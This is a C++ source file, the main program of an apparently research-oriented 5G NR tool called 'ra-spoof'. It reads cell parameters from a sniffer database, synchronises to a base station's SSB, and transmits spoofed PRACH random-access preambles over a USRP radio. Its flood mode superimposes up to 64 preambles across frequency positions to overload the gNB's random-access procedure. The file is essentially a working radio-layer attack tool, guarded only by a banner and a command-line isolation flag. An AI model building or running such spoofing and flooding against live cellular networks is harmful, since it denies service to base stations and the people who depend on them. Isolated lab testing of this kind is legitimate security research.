// ra-spoof main — Msg1 PRACH preamble injection
//
// Config: InfluxDB (live sniffer) → ra-spoof.yaml → CLI overrides

#include "cell_config.h"
#include "influx_reader.h"
#include "prach_tx.h"
#include "ra_rnti.h"
#include "ro.h"
#include "log_csv.h"
#include "tool_config.h"
#include "gnb_detect_reader.h"
#include <fstream>

#include <cstdio>
#include <cstring>
#include <csignal>
#include <getopt.h>
#include <cstdlib>
#include <string>
#include <chrono>
#include <thread>
#include <cmath>

static volatile bool g_running = true;

static void sig_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n[main] Shutting down (signal %d)...\n", sig);
        g_running = false;
    }
}

static void print_usage(const char* prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -c, --config PATH          ra-spoof.yaml path (default: configs/ra-spoof.yaml)\n");
    printf("  --influx-host HOST         InfluxDB host (default: localhost)\n");
    printf("  --influx-port PORT         InfluxDB port (default: 8086)\n");
    printf("  --influx-org ORG           InfluxDB org (default: rtu)\n");
    printf("  --influx-bucket BUCKET     InfluxDB bucket (default: rtusystem)\n");
    printf("  --influx-data-id ID        Sniffer data_id tag (default: test)\n");
    printf("  --dry-run                  Run pipeline without RF TX\n");
    printf("  --confirm-rf-isolated      Required for RF TX\n");
    printf("  --tx-gain DB               TX gain in dB\n");
    printf("  --device-args ARGS         UHD device args\n");
    printf("  --preamble-index N         RAPID (default: 0)\n");
    printf("  --continuous               Transmit on every RO\n");
    printf("  --cfo-correct / --no-cfo-correct\n");
    printf("  --cfo-sign {+1|-1}         CFO correction sign\n");
    printf("  --cfo-hz F                 Manual DL CFO (Hz)\n");
    printf("  --tx-offset-us F           Manual timing nudge (us)\n");
    printf("  --ssb-first-symbol N       Override SSB intra-slot first symbol\n");
    printf("  --freq-start N             Override msg1-FrequencyStart (PRB)\n");
    printf("  --msg1-fdm N               Override msg1-FDM (1,2,4,8)\n");
    printf("  --resync-every N           Re-sync SSB every N TX\n");
    printf("  --max-tx N                 Stop after N TX (0 = unlimited)\n");
    printf("  --flood                    Enable multi-preamble flood mode\n");
    printf("  --flood-n N                Number of preambles to flood (1-64)\n");
    printf("  --flood-strategy S         'superimpose' or 'cycle'\n");
    printf("  --flood-backoff DB         Amplitude reduction to prevent clipping\n");
    printf("  --slm-candidates N         SLM phase search count (0=Newman, default 32)\n");
    printf("  --freq-pos-count N         Superimpose N frequency positions per RO (1-16)\n");
    printf("  --gnb-log-path PATH        Path to gNB log for closed-loop reading\n");
    printf("  --autotune                 Enable experimental auto-tuning\n");
    printf("  -h, --help                 Print this help\n");
    printf("\nEnvironment:\n");
    printf("  INFLUX_TOKEN               InfluxDB auth token\n");
}

static void print_banner() {
    printf("\n");
    printf("  ================================================================\n");
    printf("   5G NR Msg1 PRACH Preamble Injector — ra-spoof\n");
    printf("   WARNING: For authorized Faraday-cage security research only.\n");
    printf("  ================================================================\n\n");
}

int main(int argc, char* argv[]) {
    print_banner();

    // --- Defaults / CLI variables ---
    std::string config_path     = "configs/ra-spoof.yaml";
    bool        dry_run         = false;
    bool        rf_isolated     = false;

    influx_cfg icfg;
    icfg.host    = "localhost";
    icfg.port    = 8086;
    icfg.org     = "rtu";
    icfg.bucket  = "rtusystem";
    icfg.data_id = "test";

    // CLI-override flags (null/negative sentinel means "not set from CLI")
    struct cli_overrides {
        bool     has_gain       = false;   double   tx_gain = 0;
        bool     has_devargs    = false;   std::string device_args;
        bool     has_preamble   = false;   uint32_t preamble_index = 0;
        bool     has_continuous = false;   bool continuous = false;
        bool     has_cfo_correct= false;   bool cfo_correct = false;
        bool     has_cfo_sign   = false;   int  cfo_sign = 0;
        bool     has_cfo_hz     = false;   double cfo_hz = 0;
        bool     has_tx_offset  = false;   double tx_offset_us = 0;
        bool     has_ssb_sym    = false;   int32_t ssb_first_symbol = 0;
        bool     has_freq_start = false;   int32_t msg1_freq_start = 0;
        bool     has_msg1_fdm   = false;   int32_t msg1_fdm = 0;
        bool     has_resync     = false;   uint32_t resync_every = 0;
        bool     has_max_tx     = false;   uint32_t max_tx = 0;
        bool     has_flood      = false;   bool flood = false;
        bool     has_flood_n    = false;   std::string flood_n;
        bool     has_flood_strat= false;   std::string flood_strategy;
        bool     has_flood_back = false;   float flood_backoff = 0.0f;
        bool     has_slm_cand   = false;   uint32_t slm_candidates = 32;
        bool     has_freq_pos   = false;   uint32_t freq_pos_count = 1;
        bool     has_log_path   = false;   std::string gnb_log_path;
        bool     has_autotune   = false;   bool autotune = false;
    } cli;

    static struct option long_opts[] = {
        {"config",              required_argument, 0, 'c'},
        {"influx-host",         required_argument, 0, 'H'},
        {"influx-port",         required_argument, 0, 'P'},
        {"influx-org",          required_argument, 0, 'O'},
        {"influx-bucket",       required_argument, 0, 'B'},
        {"influx-data-id",      required_argument, 0, 'I'},
        {"dry-run",             no_argument,       0, 'D'},
        {"confirm-rf-isolated", no_argument,       0, 'R'},
        {"tx-gain",             required_argument, 0, 'G'},
        {"device-args",         required_argument, 0, 'A'},
        {"preamble-index",      required_argument, 0, 'E'},
        {"continuous",          no_argument,       0, 'T'},
        {"cfo-correct",         no_argument,       0, 'C'},
        {"no-cfo-correct",      no_argument,       0, 'F'},
        {"cfo-sign",            required_argument, 0, 'S'},
        {"cfo-hz",              required_argument, 0, 'Z'},
        {"tx-offset-us",        required_argument, 0, 'U'},
        {"ssb-first-symbol",    required_argument, 0, 'L'},
        {"freq-start",          required_argument, 0, 'Q'},
        {"msg1-fdm",            required_argument, 0, 'd'},
        {"resync-every",        required_argument, 0, 'Y'},
        {"max-tx",              required_argument, 0, 'M'},
        {"flood",               no_argument,       0, 'v'},
        {"flood-n",             required_argument, 0, 'n'},
        {"flood-strategy",      required_argument, 0, 'x'},
        {"flood-backoff",       required_argument, 0, 'y'},
        {"slm-candidates",      required_argument, 0, 'p'},
        {"freq-pos-count",      required_argument, 0, 'N'},
        {"gnb-log-path",        required_argument, 0, 'l'},
        {"autotune",            no_argument,       0, 'a'},
        {"help",                no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "c:h", long_opts, nullptr)) != -1) {
        switch (c) {
            case 'c': config_path        = optarg; break;
            case 'H': icfg.host          = optarg; break;
            case 'P': icfg.port          = atoi(optarg); break;
            case 'O': icfg.org           = optarg; break;
            case 'B': icfg.bucket        = optarg; break;
            case 'I': icfg.data_id       = optarg; break;
            case 'D': dry_run            = true; break;
            case 'R': rf_isolated        = true; break;
            case 'G': cli.tx_gain        = atof(optarg); cli.has_gain = true; break;
            case 'A': cli.device_args    = optarg; cli.has_devargs = true; break;
            case 'E': cli.preamble_index = (uint32_t)atoi(optarg); cli.has_preamble = true; break;
            case 'T': cli.continuous     = true; cli.has_continuous = true; break;
            case 'C': cli.cfo_correct    = true; cli.has_cfo_correct = true; break;
            case 'F': cli.cfo_correct    = false; cli.has_cfo_correct = true; break;
            case 'S': cli.cfo_sign       = atoi(optarg); cli.has_cfo_sign = true; break;
            case 'Z': cli.cfo_hz         = atof(optarg); cli.has_cfo_hz = true; break;
            case 'U': cli.tx_offset_us   = atof(optarg); cli.has_tx_offset = true; break;
            case 'L': cli.ssb_first_symbol = (int32_t)atoi(optarg); cli.has_ssb_sym = true; break;
            case 'Q': cli.msg1_freq_start = (int32_t)atoi(optarg); cli.has_freq_start = true; break;
            case 'd': cli.msg1_fdm       = (int32_t)atoi(optarg); cli.has_msg1_fdm = true; break;
            case 'Y': cli.resync_every   = (uint32_t)atoi(optarg); cli.has_resync = true; break;
            case 'M': cli.max_tx         = (uint32_t)atoi(optarg); cli.has_max_tx = true; break;
            case 'v': cli.flood          = true; cli.has_flood = true; break;
            case 'n': cli.flood_n        = optarg; cli.has_flood_n = true; break;
            case 'x': cli.flood_strategy = optarg; cli.has_flood_strat = true; break;
            case 'y': cli.flood_backoff  = atof(optarg); cli.has_flood_back = true; break;
            case 'p': cli.slm_candidates = (uint32_t)atoi(optarg); cli.has_slm_cand = true; break;
            case 'N': cli.freq_pos_count = (uint32_t)atoi(optarg); cli.has_freq_pos = true; break;
            case 'l': cli.gnb_log_path   = optarg; cli.has_log_path = true; break;
            case 'a': cli.autotune       = true; cli.has_autotune = true; break;
            case 'h': print_usage(argv[0]); return 0;
            default:  print_usage(argv[0]); return 1;
        }
    }

    // --- Load tool_config from YAML ---
    tool_config tc;
    parse_tool_config(config_path, tc);

    // --- Apply CLI overrides on top (CLI always wins) ---
    if (cli.has_gain)        { tc.tx.gain_db        = cli.tx_gain;        tc.tx.src_gain      = tool_config::SRC_CLI; }
    if (cli.has_devargs)     { tc.tx.device_args     = cli.device_args;    tc.tx.src_devargs   = tool_config::SRC_CLI; }
    if (cli.has_preamble)    { tc.tx.preamble_index  = cli.preamble_index; tc.tx.src_preamble  = tool_config::SRC_CLI; }
    if (cli.has_continuous)  { tc.run.continuous     = cli.continuous;     tc.run.src_cont     = tool_config::SRC_CLI; }
    if (cli.has_cfo_correct) { tc.cfo.correct        = cli.cfo_correct;    tc.cfo.src_correct  = tool_config::SRC_CLI; }
    if (cli.has_cfo_sign)    { tc.cfo.sign           = cli.cfo_sign;       tc.cfo.src_sign     = tool_config::SRC_CLI; }
    if (cli.has_cfo_hz)      { tc.cfo.manual_hz      = cli.cfo_hz;         tc.cfo.src_manual_hz = tool_config::SRC_CLI; }
    if (cli.has_tx_offset)   { tc.timing.tx_offset_us = cli.tx_offset_us;  tc.timing.src_tx_offset = tool_config::SRC_CLI; }
    if (cli.has_ssb_sym)     { tc.timing.ssb_first_symbol_override = cli.ssb_first_symbol; tc.timing.src_ssb_sym = tool_config::SRC_CLI; }
    if (cli.has_freq_start)  { tc.freq.msg1_freq_start_override = cli.msg1_freq_start; tc.freq.src_freq_start = tool_config::SRC_CLI; }
    if (cli.has_msg1_fdm)    { tc.freq.msg1_fdm_override = cli.msg1_fdm; tc.freq.src_fdm = tool_config::SRC_CLI; }
    if (cli.has_resync)      { tc.run.resync_every  = cli.resync_every;    tc.run.src_resync   = tool_config::SRC_CLI; }
    if (cli.has_max_tx)      { tc.run.max_tx        = cli.max_tx;          tc.run.src_max_tx   = tool_config::SRC_CLI; }
    if (cli.has_flood)       { tc.flood.enabled     = cli.flood;           tc.flood.src_enabled  = tool_config::SRC_CLI; }
    if (cli.has_flood_n)     { tc.flood.preamble_list = cli.flood_n;       tc.flood.src_num    = tool_config::SRC_CLI; }
    if (cli.has_flood_strat) { tc.flood.strategy    = cli.flood_strategy;  tc.flood.src_strategy = tool_config::SRC_CLI; }
    if (cli.has_flood_back)  { tc.flood.power_backoff_db = cli.flood_backoff; tc.flood.src_backoff = tool_config::SRC_CLI; }
    if (cli.has_slm_cand)    { tc.flood.slm_candidates = cli.slm_candidates; tc.flood.src_slm = tool_config::SRC_CLI; }
    if (cli.has_freq_pos)    { tc.multi_ro.freq_pos_count = cli.freq_pos_count; tc.multi_ro.src_freq_pos = tool_config::SRC_CLI; }
    if (cli.has_log_path)    { tc.run.gnb_log_path = cli.gnb_log_path; tc.run.src_log_path = tool_config::SRC_CLI; }
    if (cli.has_autotune)    { tc.run.autotune = cli.autotune; tc.run.src_autotune = tool_config::SRC_CLI; }

    // Safety checks
    if (tc.tx.gain_db > 80.0) {
        fprintf(stderr, "FATAL: TX gain %.1f dB exceeds safety cap (80 dB). Refusing.\n", tc.tx.gain_db);
        return 1;
    }
    if (!rf_isolated && !dry_run) {
        fprintf(stderr, "FATAL: RF TX requires --confirm-rf-isolated flag.\n"
                        "       Use --dry-run for offline testing.\n");
        return 1;
    }
    if (tc.cfo.sign != +1 && tc.cfo.sign != -1) {
        fprintf(stderr, "FATAL: cfo.sign must be +1 or -1 (got %d)\n", tc.cfo.sign);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // --- Dry-run: print resolved config and exit ---
    if (dry_run) {
        printf("[main] DRY RUN -- resolved configuration:\n");
        print_tool_config(tc);
    }

    // -----------------------------------------------------------------------
    // Step 1: Load cell config from InfluxDB (sole config source)
    // -----------------------------------------------------------------------
    cell_config cfg;

    printf("[main] Step 1: Pulling cell config from InfluxDB...\n");
    if (!influx_pull_cell_config(icfg, cfg)) {
        fprintf(stderr, "[main] FATAL: InfluxDB pull failed.\n");
        return 1;
    }
    influx_sanity_check(cfg);

    // Apply overrides
    if (tc.freq.msg1_freq_start_override >= 0) {
        cfg.prach_freq_offset = tc.freq.msg1_freq_start_override;
        printf("[main] OVERRIDE: msg1-FrequencyStart = %u\n", cfg.prach_freq_offset);
    }
    if (tc.freq.msg1_fdm_override >= 0) {
        cfg.msg1_fdm = tc.freq.msg1_fdm_override;
        printf("[main] OVERRIDE: msg1_fdm = %u\n", cfg.msg1_fdm);
    }
    
    // Populate prach_x/y/subframe/format from prach_config_idx
    cfg.resolve_prach_ro();
    print_cell_config(cfg);

    // -----------------------------------------------------------------------
    // Step 2: Compute RA-RNTI
    // -----------------------------------------------------------------------
    uint32_t s_id       = 0;
    uint32_t t_id       = cfg.prach_subframe;
    uint32_t f_id       = 0;
    uint32_t ul_carrier = 0;

    uint16_t ra_rnti = compute_ra_rnti(s_id, t_id, f_id, ul_carrier);
    printf("\n[main] Step 2: RA-RNTI = 1 + %u + 14*%u = 0x%04x (%u)\n",
           s_id, t_id, ra_rnti, ra_rnti);

    // -----------------------------------------------------------------------
    // Step 3: Find next PRACH occasion
    // -----------------------------------------------------------------------
    printf("\n[main] Step 3: RACH occasion timing:\n");
    printf("  config_idx=%u → subframe %u, SFN %% %u == %u\n",
           cfg.prach_config_idx, cfg.prach_subframe, cfg.prach_x, cfg.prach_y);

    ro::print_occasions_in_range(cfg, 0, 200);

    uint32_t ro_sys_slot = ro::next_occasion_slot(cfg, 0);
    uint32_t ro_sfn, ro_slot_in_frame;
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);
    printf("\n[main] Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);

    // -----------------------------------------------------------------------
    // Step 4: Initialize PRACH TX
    // -----------------------------------------------------------------------
    printf("\n[main] Step 4: Initializing PRACH TX...\n");
    printf("[main] CFO correction: %s (sign=%+d manual_hz=%.0f)\n",
           tc.cfo.correct ? "enabled" : "disabled", tc.cfo.sign, tc.cfo.manual_hz);
    prach_tx ptx;
    if (!ptx.init(cfg, tc, dry_run)) {
        fprintf(stderr, "[main] FATAL: prach_tx::init failed\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 5: Open USRP
    // -----------------------------------------------------------------------
    printf("\n[main] Step 5: Opening USRP...\n");
    if (!ptx.open_rf(tc.tx.device_args)) {
        fprintf(stderr, "[main] FATAL: Failed to open USRP\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 6: Initialize logging
    // -----------------------------------------------------------------------
    log_csv::init("ra-spoof_msg1.csv");

    // -----------------------------------------------------------------------
    // Step 6.5: SSB sync
    // -----------------------------------------------------------------------
    printf("\n[main] Step 6.5: Synchronizing to gNB SSB (PCI=%u)...\n", cfg.pci);

    {
        uint32_t fb_sfn=0, fb_ssb_idx=0, fb_ssb_slot=0, fb_scs=0;
        bool fb_hrf=false;
        double fb_unix_time=0.0;
        if (influx_pull_mib_timing(icfg, &fb_sfn, &fb_ssb_idx, &fb_hrf,
                                   &fb_ssb_slot, &fb_scs, &fb_unix_time)) {
            ptx.set_sync_fallback(fb_unix_time, fb_sfn, fb_ssb_slot, fb_ssb_idx);
        } else {
            printf("[main] WARNING: Could not pull MIB timing from sniffer\n");
        }
    }

    if (!ptx.sync_to_ssb()) {
        fprintf(stderr, "[main] FATAL: SSB sync failed.\n");
        log_csv::close();
        return 1;
    }
    printf("[main] SSB sync OK. Recomputing RO from live timing...\n");

    uint32_t sync_sys_slot = ro::system_slot(ptx.get_sync_sfn(), ptx.get_sync_slot());
    ro_sys_slot = ro::next_occasion_slot(cfg, sync_sys_slot);
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);
    printf("[main] Updated Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);
           
    // -----------------------------------------------------------------------
    // Step 6.75: Initialize gNB Log Reader (Item 3)
    // -----------------------------------------------------------------------
    gnb_detect_reader reader;
    std::ofstream det_csv;
    if (tc.run.continuous) {
        if (!reader.init(tc.run.gnb_log_path)) {
            fprintf(stderr, "[main] WARNING: Could not open gNB log '%s' for closed-loop reading\n", tc.run.gnb_log_path.c_str());
        } else {
            det_csv.open("gnb_detections.csv", std::ios::out);
            if (det_csv.is_open()) {
                det_csv << "tx_time,tx_sfn,tx_slot_in_frame,mode,flood_n,num_detected,detected_idx_list,ta_list,power_list,snr_list\n";
            }
        }
    }

    // -----------------------------------------------------------------------
    // Step 7: Transmit preamble(s)
    // -----------------------------------------------------------------------
    printf("\n[main] Step 7: Transmitting PRACH preamble (Msg1)...\n");

    if (tc.run.continuous) {
        printf("[main] Continuous mode: transmitting on every RO (Ctrl-C to stop).\n");
    }

    uint32_t  tx_ro_sys_slot = ro_sys_slot;
    uint32_t  tx_ro_sfn      = ro_sfn;
    uint32_t  tx_ro_slot     = ro_slot_in_frame;
    uint32_t  tx_count       = 0;
    uint32_t  tx_ok_count    = 0;
    double    last_tx_time    = 0.0;
    // RO period = prach_x frames × 10 ms/frame
    // (e.g. config_idx=13 → prach_x=2 → 20 ms; was incorrectly hardcoded to 160 ms)
    const double ro_interval_s = (double)cfg.prach_x * 10e-3;

    do {
        if (tc.run.continuous && tx_count > 0) {
            printf("\n--- Transmission %u (loop) ---\n", tx_count + 1);
        }

        // B5: Drift guard — triggers re-anchor when accumulated timing error
        // would exceed 30% of the Format-0 CP window (103 us), or when too much
        // time has passed since the last sync.  Runs alongside the count-based
        // resync_every mechanism; whichever fires first wins.
        if (tc.run.continuous && tx_count > 0 && ptx.get_synced()) {
            // Format 0 CP: N_CP = 3168 samples at Δf=15kHz, srate=30.72 MHz → 103.125 us
            constexpr double cp_format0_s    = 103.125e-6;
            constexpr double resync_fraction = 0.30;  // re-anchor at 30% CP drift
            constexpr double max_sync_age_s  = 30.0;  // hard upper bound

            double drift_ppm       = ptx.get_clock_drift_ppm();
            double time_since_sync = ptx.get_time_since_last_sync_s();
            double est_error_s     = std::abs(drift_ppm / 1e6) * time_since_sync;
            bool   drift_guard_trip = (est_error_s > resync_fraction * cp_format0_s)
                                   || (time_since_sync > max_sync_age_s && time_since_sync > 0.0);

            if (drift_guard_trip) {
                printf("[main] Drift guard: est_error=%.1f us (drift=%.3f ppm, age=%.1f s) — re-anchoring\n",
                       est_error_s * 1e6, drift_ppm, time_since_sync);
                if (!ptx.sync_to_ssb()) {
                    fprintf(stderr, "[main] WARNING: drift guard re-anchor failed, continuing\n");
                }
            }
        }

        // Optional count-based re-sync (resync_every)
        if (tc.run.resync_every > 0 && tx_count > 0 && tx_count % tc.run.resync_every == 0) {
            printf("[main] Re-syncing to SSB (every %u TX)...\n", tc.run.resync_every);
            if (!ptx.sync_to_ssb()) {
                fprintf(stderr, "[main] WARNING: re-sync failed, continuing with old timing\n");
            }
        }

        bool tx_ok;
        if (tc.run.continuous && tx_count > 0 && last_tx_time > 0.0) {
            // Scale ro_interval_s by the USRP oscillator ppm error derived from the
            // measured DL CFO.  The USRP's reference clock runs at a slightly wrong
            // rate; the same fractional error that causes CFO also stretches/compresses
            // the device-time intervals.  Correcting the interval prevents the TX
            // window from drifting across the gNB's RO boundary over many bursts.
            // Safe at startup: get_clock_drift_ppm() returns 0 until sync_to_ssb() runs.
            double drift_correction = 1.0 + ptx.get_clock_drift_ppm() / 1e6;
            double next_tx_time = ptx.get_last_tx_time() + ro_interval_s * drift_correction;
            tx_ok = ptx.transmit_at_time(next_tx_time, tx_ro_sfn, tx_ro_slot);
            last_tx_time = next_tx_time;
        } else {
            tx_ok = ptx.transmit_preamble(tx_ro_sfn, tx_ro_slot);
            last_tx_time = ptx.get_last_tx_time();
        }

        if (tx_ok) {
            tx_ok_count++;
            // Log using the primary (f_id=0) RA-RNTI for backward CSV compatibility
            auto all_rntis = ptx.get_multi_ro_ra_rntis(tx_ro_slot);
            if (all_rntis.size() > 1) {
                printf("[main] Burst RA-RNTIs (%zu positions):", all_rntis.size());
                for (auto r : all_rntis) printf(" 0x%04x", r);
                printf("\n");
            }
            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               all_rntis[0], tc.tx.preamble_index, tc.tx.gain_db,
                               0, "transmitted",
                               ptx.get_flood_num_preambles(),
                               ptx.get_flood_strategy().c_str(),
                               ptx.get_current_rapid_list().c_str());
        } else {
            fprintf(stderr, "[main] PRACH transmission %u failed\n", tx_count + 1);
            auto all_rntis = ptx.get_multi_ro_ra_rntis(tx_ro_slot);
            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               all_rntis[0], tc.tx.preamble_index, tc.tx.gain_db,
                               0, "failed",
                               ptx.get_flood_num_preambles(),
                               ptx.get_flood_strategy().c_str(),
                               ptx.get_current_rapid_list().c_str());
        }
        
        // Item 3 & 6: Closed-loop reader & Optional Autotune
        if (tc.run.continuous && tx_ok) {
            std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Settle delay
            auto new_dets = reader.read_new_detections();
            
            struct timeval tv;
            gettimeofday(&tv, NULL);
            double tx_wall_time = tv.tv_sec + tv.tv_usec / 1e6;
            
            std::vector<gnb_detection_record> matched_dets;
            for (const auto& d : new_dets) {
                // Tolerant matching: slot matches, and time is recent. 
                // We use wall_time logged in read_new_detections which is strictly >= tx_wall_time.
                if (d.slot == tx_ro_slot) {
                    matched_dets.push_back(d);
                }
            }
            
            if (det_csv.is_open()) {
                det_csv << std::fixed << tx_wall_time << ","
                        << tx_ro_sfn << "," << tx_ro_slot << ","
                        << ptx.get_flood_strategy() << ","
                        << ptx.get_flood_num_preambles() << ","
                        << matched_dets.size() << ",\"";
                for (size_t i=0; i<matched_dets.size(); i++) {
                    det_csv << matched_dets[i].idx;
                    if (i < matched_dets.size()-1) det_csv << ";";
                }
                det_csv << "\",\"";
                for (size_t i=0; i<matched_dets.size(); i++) {
                    det_csv << matched_dets[i].ta_us;
                    if (i < matched_dets.size()-1) det_csv << ";";
                }
                det_csv << "\",\"";
                for (size_t i=0; i<matched_dets.size(); i++) {
                    det_csv << matched_dets[i].power_db;
                    if (i < matched_dets.size()-1) det_csv << ";";
                }
                det_csv << "\",\"";
                for (size_t i=0; i<matched_dets.size(); i++) {
                    det_csv << matched_dets[i].snr_db;
                    if (i < matched_dets.size()-1) det_csv << ";";
                }
                det_csv << "\"\n";
                det_csv.flush();
            }
            
            // Optional auto-tune
            if (tc.run.autotune && tx_count >= 10 && matched_dets.size() > 0) {
                 printf("[main] AUTOTUNE: observed %zu detections. (Auto-tuning logic placeholder)\n", matched_dets.size());
            }
        }

        if (!tc.run.continuous) break;

        tx_count++;
        if (tc.run.max_tx > 0 && tx_count >= tc.run.max_tx) {
            printf("[main] max_tx=%u reached, stopping\n", tc.run.max_tx);
            break;
        }

        tx_ro_sys_slot = ro::next_occasion_slot(cfg, tx_ro_sys_slot);
        ro::from_system_slot(tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot);
        printf("[main] Next RO: SFN=%u slot=%u (system_slot=%u)\n",
               tx_ro_sfn, tx_ro_slot, tx_ro_sys_slot);

        std::this_thread::sleep_for(std::chrono::milliseconds(2));

    } while (g_running);

    if (tc.run.continuous) {
        printf("\n[main] ========== SUMMARY ==========\n");
        printf("[main] Total transmissions: %u\n", tx_count);
        printf("[main] Successful:          %u\n", tx_ok_count);
        printf("[main] Failures:            %u\n", tx_count - tx_ok_count);
    }

    printf("[main] Expected gNB behavior:\n");
    {
        auto final_rntis = ptx.get_multi_ro_ra_rntis(ro_slot_in_frame);
        printf("  1. gNB log: 'PRACH detected preamble=...' \n");
        if (final_rntis.size() == 1) {
            printf("  2. gNB emits RAR on RA-RNTI=0x%04x (%u)\n",
                   final_rntis[0], final_rntis[0]);
        } else {
            printf("  2. gNB must emit %zu RARs (one per freq position):\n", final_rntis.size());
            for (uint32_t k = 0; k < final_rntis.size(); k++) {
                printf("     pos[%u] f_id=%u  RA-RNTI=0x%04x (%u)\n",
                       k, k, final_rntis[k], final_rntis[k]);
            }
        }
    }
    printf("[main] Check: tail -f /tmp/gnb.log | grep -E 'PRACH|preamble|RAR|ra.rnti'\n");

    log_csv::close();
    printf("\n[main] Done.\n\n");

    int ret = (tx_ok_count > 0) ? 0 : 1;

    fflush(stdout);
    fflush(stderr);
    _exit(ret);
}
